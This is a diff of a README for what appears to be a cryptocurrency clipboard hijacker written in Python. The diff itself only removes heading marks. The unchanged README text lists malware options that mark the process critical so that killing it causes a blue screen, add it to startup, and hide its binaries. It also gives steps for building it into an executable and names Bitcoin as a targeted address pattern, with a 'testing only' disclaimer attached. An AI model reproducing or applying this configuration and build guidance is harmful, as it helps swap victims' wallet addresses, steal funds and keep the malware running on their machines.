@@ -5,7 +5,7 @@ I am not responsible for the use you give to it. USE IT ONLY FOR TESTING PORPUSE
 
 
 
-#REQUIREMENTS:
+REQUIREMENTS:
 --pyperclip
 --time
 --re
@@ -14,14 +14,14 @@ I am not responsible for the use you give to it. USE IT ONLY FOR TESTING PORPUSE
 --sys
 --inspect
 
-#Configuring
+Configuring
 
 CRITICAL_PROCCESS = True # Mark the proccess as critical, if interrumpted, blue screen appears.
 ADD_TO_STARTUP = True # Add proccess to startup.
 HIDE_BINARIES = True # Hide binaries.
 
 
-#Make the Executable
+Make the Executable
 
 pip install auto-py-to-exe
 auto-py-to-exe
@@ -30,7 +30,7 @@ One directory
 Console based
 
 
-#REGEX SUPPORTED
+REGEX SUPPORTED
 
 
     Bitcoin
